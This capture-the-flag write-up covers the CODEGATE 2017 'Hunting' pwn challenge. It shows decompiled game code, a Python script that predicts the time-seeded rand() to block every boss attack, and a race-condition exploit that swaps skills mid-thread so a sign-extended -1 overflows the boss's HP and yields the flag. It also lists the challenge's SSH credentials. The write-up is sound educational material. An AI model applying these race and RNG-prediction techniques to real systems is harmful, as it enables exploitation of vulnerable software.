# CODEGATE 2017 Prequalification - pwn - Hunting - 350 pts



> Description: Hunting Monster
>
> ssh hunting@110.10.212.133 -p5555 (pw : hunting)
>
> Attachment: [hunting](hunting) [xpl.py](xpl.py)
>

# Write-up

The hunting binary turned out to be a little game, in which we had to kill a "boss". For this we were provided with different skills, which we could use against him. On every attack, he does a counter-attack and we're able to use a specific shield (ice, fire, wind). If our shield matches his attack, we won't lose any hitpoints. 

Let's have a look at the disassembled parts of the binary:

**Main menu:**

``` c 
  // Initializing random generator with current time as seed
  v3 = time(0LL);
  srand(v3);
  
  playerActionCount = 0;
  
  while ( 2 )
  {
    if ( playerActionCount > 249 )
    {
      puts("Game Over");
      result = 0LL;
    }
    else if ( byte_6033F0 )
    {
      puts("What's your name?");
      scanf("%s", &v9);
      result = 0LL;
    }
    else
    {
      showMenu();
      printf("choice:", a2);
      a2 = (char **)&input;
      scanf("%d", &input);
      switch ( input )
      {
        case 1:
          showHelp();
          goto LABEL_12;
        case 2:
          a2 = 0LL;
          pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL);
          goto LABEL_12;
        case 3:
          changeSkill((__int64)&game);
          goto LABEL_12;
        case 4:
          removeSkill((__int64)&game);
          goto LABEL_12;
        case 5:
          receiveSuggestion();
LABEL_12:
          if ( input == 2 )
          {
            defendFunc((__int64)&game);
            sleep(0);
          }
          ++playerActionCount;
          continue;
        default:
          result = 0LL;
          break;
      }
    }
    break;
  }
```

Option 2 is for "Use skill", which lets us attack the boss. It will start a new thread for calculating the player attack against the boss and then calls the "defend"-function (in the main thread), in which the attack from the boss is handled. After that, it will directly loop back into the menu.

We should keep that in mind, since this makes it possible to trigger another option, while the attack thread is still running, if executed fast enough.

First, we tried to just stay alive and kill the boss by just not dying. To be able to do this, we need to know what attack the boss will be doing next, before it is executed. So let's have a look at the "defend" function:

**Defend**

```C
  puts("\n========================================Boss' Attack");
  puts("Boss is Attacking you!");
  showShieldMenu();		// Just shows the option we can use
  printf("choice:");
  scanf("%d", &v7);
  // Set the shield we're using to 1
  switch ( v7 )
  {
    case 2:
      *(_BYTE *)(a1 + 13) = 1;		// fire shield
      break;
    case 3:
      *(_BYTE *)(a1 + 14) = 1;		// wind shield
      break;
    case 1:
      *(_BYTE *)(a1 + 12) = 1;		// ice shield
      break;
  }
  // Calculate the attack the boss will use
  bossAttackRand = rand();
  v8 = bossAttackRand;
  bossAttack = ((((unsigned int)((unsigned __int64)bossAttackRand >> 32) >> 30) + (_BYTE)bossAttackRand) & 3) 
               - ((unsigned int)((unsigned __int64)bossAttackRand >> 32) >> 30);
  v9 = bossAttack;
  if ( bossAttack == 1 )
  {
    if ( *(_BYTE *)(a1 + 14) )
    {
      puts("You succeed in defense");
    }
    else
    {
      v4 = *(_QWORD *)a1;
      *(_QWORD *)a1 = v4 - return250_2();
    }
  }
  else if ( bossAttack == 2 )
  {
    if ( *(_BYTE *)(a1 + 13) )
    {
      puts("You succeed in defense");
    }
    else
    {
      v5 = *(_QWORD *)a1;
      *(_QWORD *)a1 = v5 - return250();
    }
  }
  else if ( !bossAttack )
  {
    if ( *(_BYTE *)(a1 + 12) )
    {
      puts("You succeed in defense");
    }
    else
    {
      v3 = *(_QWORD *)a1;
      *(_QWORD *)a1 = v3 - return250_3();
    }
  }
  resetShields(a1);
  showPlayerHP((_QWORD *)a1);
  puts("========================================");
```

So it basically just uses

```c
rand() & 3
```

to calculate the attack, the boss will be using. 

Since the random generator was initialized with the current time as seed, we should easily be able to guess the attack every time and use the appropriate shield by initializing our own random generator with the same time (which is just current time at process start).

We'll have to bear in mind, that in the player attack thread also a rand() is used to calculate the damage the player is doing to the boss. So we'll need to consume two rand()'s per round to stay in sync with the app rng.

So we'll start just casting iceball again and again, while defending perfectly against the boss attacks.

**First try**

```python
#!/usr/bin/python
from pwnlib.tubes import process
from ctypes import *
import sys, time, re

cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")

playerLevel = 1
playerHP = 500
bossHP = 100
counter = 0

# Change curently used skill
def changeskill(skill):
	r.sendline('3')
	r.sendline(str(skill))
	r.recvuntil("Exit\n")

# Get the matching shield countering the boss attack
def getShieldToUse(attack):
	if attack == 1:
		return 3
	elif attack == 2:
		return 2
	else:
		return 1

# just a helper to match current states
def findValue(pattern, msg, defValue):
	match = re.search(pattern, msg, re.S)

	if match:
		return int(match.group(1))

	return defValue

# check for state changes in server responses
def checkForStates(msg):
	global playerLevel, bossHP, playerHP

	playerLevel = findValue("level:(.?)\n", msg, playerLevel)
	bossHP = findValue("Boss's hp is (.+?)\n", msg, bossHP)
	playerHP = findValue("Your HP is (.+?)\n", msg, playerHP)

# Call the "Use skill" option to attack the boss and defend against his attack
def useskill():
	global counter, playerLevel, playerHP, bossHP

	# print out some info
	print ("")
	print ("Start attack round")
	print ("")
	print (" [+] Current level : %d" % playerLevel)
	print (" [+] Player HP     : %d" % playerHP)
	print (" [+] Boss HP       : %d" % bossHP)
	print ("")

	# Send "Use skill"
	r.sendline('2')

	libc.rand()				# consume rand for player attack in attack thread
	bossAttack = libc.rand() & 3	# rand for boss attack in defend function

	time.sleep(0.1)

	useShield = getShieldToUse(bossAttack)

	# Send the shield we want to use to the server
	r.sendline(str(useShield))

	# Receive responses and update player states
	checkForStates(r.recv(timeout=1))
	checkForStates(r.recvuntil("Exit\n", timeout=1))

def exploit(r):
	r.recvuntil("Exit\n", timeout=0.2)

	# Select iceball 
	changeskill(3)

	while 1:
		# Keep attacking
		useskill()

r = process.process("./hunting")

# Initialize rng with current time
libc.srand(libc.time(None))

exploit(r)
```

Ok, that made us invincible for now, so it wasn't a problem anymore to kill the boss without losing any health:

```shell
$ python xplshield.py 
[+] Started program './hunting'

Start attack round

 [+] Current level : 1
 [+] Player HP     : 500
 [+] Boss HP       : 100


Start attack round

 [+] Current level : 2
 [+] Player HP     : 500
 [+] Boss HP       : -502

[SNIP]

Start attack round

 [+] Current level : 3
 [+] Player HP     : 500
 [+] Boss HP       : 580


Start attack round

 [+] Current level : 4
 [+] Player HP     : 500
 [+] Boss HP       : -136


Start attack round

 [+] Current level : 4
 [+] Player HP     : 500
 [+] Boss HP       : 9223372036854775033


Start attack round

 [+] Current level : 4
 [+] Player HP     : 500
 [+] Boss HP       : 9223372036854774952
``` 

But at level 4, the boss hp jumped up just a "little bit". Since our damage value is calculated in 32bit, it would've taken forever to kill the boss this way.

So we need another approach to kill the boss faster. Let's check how the player damage is calculated:

```C
  puts("\n========================================Skill Activation");
  printf("\rYou use %s\n", a1 + 32);
  for ( i = 0; i <= 8 && strcmp((const char *)(a1 + 32), &aAttack[32 * i]); ++i );
  
  executePlayerAttack(a1 + 32);
  
  if ( useSkillLockObject )
  {
    printf("You are already using the skill. Skill failed to use:%s\n", a1 + 32);
  }
  else
  {
    useSkillLockObject = 1;
    if ( i <= 4 )
    {
      // Check that the damage value isn't negative
      if ( *(_QWORD *)(a1 + 72) < 0LL )
      {
        puts("Damage can't be negative number!");
      }
      else
      {
        // Subtract the rand()-value from boss hp (converts the 32bit dmg to 64bit signed with cdqe before)
        *(_QWORD *)(a1 + 24) -= (signed int)*(_QWORD *)(a1 + 72);
        printf("Boss's hp is %ld\n", *(_QWORD *)(a1 + 24));
      }
    }
    // Check that the damage value isn't negative
    else if ( *(_QWORD *)(a1 + 72) < 0LL )
    {
      puts("Damage can't be negative number!");
    }
    else
    {
      // Subtract the rand() value from boss hp 
      *(_QWORD *)(a1 + 24) -= *(_QWORD *)(a1 + 72);
      printf("Boss's hp is %ld\n", *(_QWORD *)(a1 + 24));
    }
    checkBossDeath((__int64)&game);
    useSkillLockObject = 0;
  }
  *(_QWORD *)(a1 + 72) = 0LL;
  return puts("\n=======================================");
}
```

In the executePlayerAttack function, it will check for the skill we're currently using and depending on it, our damage will be calculated .

Just a quick peek at some skills and their calculations:

**Iceball**
```C
  sleep(0);
  result = (unsigned __int64)executeIceball((_QWORD *)(a1 + 40));
```
```C
  v1 = (unsigned __int16)rand() % 1000;
  *a1 = v1;				// Damage for iceball
``` 

**Fireball**
```C
  executeFireball((_QWORD *)(a1 + 40));
  result = sleep(1u);
```

```c
  v1 = (rand() % 1000 << 16) % 100;
  *a1 = v1;				// Damage for fireball
```

**Icesword**
```c
  executeIcesword((_QWORD *)(a1 + 40));
  result = sleep(1u);
```
```c
  v1 = (unsigned __int16)rand();
  v2 = (rand() << 16) & 0x8FFFFFFF | v1;
  v3 = v2 | ((signed __int64)rand() << 32) & 0xFFFF00000000LL;
  *a1 = 0xFFFFFFFFLL;		// Damage for icesword
```

So there are some subtile differences between those skills. 

- Iceball can do a good amount of damage (0-1000). 
- Fireball can do a max damage of 100, but it lets the attack thread sleep for 1 second, which iceball doesn't.
- Icesword seems to be calculating alot but in reality it just always returns "-1" as dmg (0xffffffff in 32 bit)

Back to the attacking thread. It tries to "lock" the attack calculation with an if/else checking if a "lock object" is set. 

```c
if ( useSkillLockObject )
  {
    printf("You are already using the skill. Skill failed to use:%s\n", a1 + 32);
  }
  else
  {
    useSkillLockObject = 1;
```

One of the most common examples of how **not** to implement "thread safety". Since we're multi-threading, the attack thread can suspend on every instruction, letting other threads (like the main thread) do something. 

The attack thread will then check, if we're using a skill below or equal "4", and if so, subtracts its damage value from the boss hp (**calling cdqe before, converting the damage value into a signed 64 bit value**). If we're using a skill above 4 it won't convert the damage value and use the value as it is.

This means, if we're using icesword, the binary is using the second damage calculation, interpreting the value as 64 bit 0xFFFFFFFF (resulting in 4294967295 damage, which means nothing to the current boss hp). But if we would be able to get it to use the first calculation it would convert the damage of icesword to a qword resulting in a 64 bit 0xFFFFFFFFFFFFFFFF (resulting in -1 damage, which would then be suctracted, and thus gets **added** onto the boss hp). 

Since the boss has  0x7FFFFFFFFFFFFFFF (9223372036854775807) HP  , adding 1 to it, would let it "overflow" to 0x8000000000000000 (-9223372036854775808) HP, killing him instantenously.

So what we need to do:

- Let the binary think we're using a skill <= 4, to get into the first "calculation method"
- Get over the negative damage check 
- Change the skill just before the damage gets subtracted from the boss hp by switching to icesword and attack with it

The sleep from "Fireball" and "Icesword" is there to help with this. As soon as we reach level 4 we will change our attack pattern to:

- Select "Fireball"
- Use skill
- Immediately change skill to "Ice sword"
- Use skill

If we manage to do this in the correct timing, this should do the following:

- Enter the boss attack thread, trying to execute fireball
- The fireball calculation will create some minor damage value, then sleep 1 second (giving us time to send another input)
- The boss attack thread will then check, if we're using a skill below or equal to "4" (which fireball is)
- While this is happening we're already switching our skill on the main thread to "Ice sword" and execute another attack
- Since the damage from icesword will be calculated 1 second after fireball the chances are high, that we'll pass the "skill lock" and the "skill" check, and replace the player damage with 0xFFFFFFFF, which gets then converted to "-1"  just before subtracting it from the boss hp.

```python
	 if playerLevel == 4:
                # On level4 we can use icesword which results in -1 dmg
                r.recv(timeout=1)

                # Try to guess the boss attack, but this doesn't work reliable anymore since
                # fireball also adds another sleep, so we just have to hope ;-)
                bossAttack = libc.rand() & 3
                libc.rand() & 3
                libc.rand() & 3
                libc.rand() & 3

                useShield = getShieldToUse(bossAttack)

                # This will switch to fireball, attack and immediately switch $
                # (while the attack thread is running and already passed the skill check)
                time.sleep(1)
                r.send("3\n2\n2\n%s\n" % str(useShield))
                time.sleep(0.1)
                r.send("3\n7\n2\n1\n")

                checkForStates(r.recv())

                time.sleep(10)

                counter += 1

                if counter==2:
                        # Hopefully we killed the boss here, executing cat /ho$
                        r.interactive()

                return
```

Race conditions aren't always very predictable, but after two or three tries, the script resulted in a "boss kill", which rewarded us with another flag:


```bash
You use icesword
Boss hp is -9223372036854775808
Contraturation! You win!
You are already using the skill. Skill failed to use:icesword

=============================
s1mp13_rac3_c0nd1t10n_gam3_
```





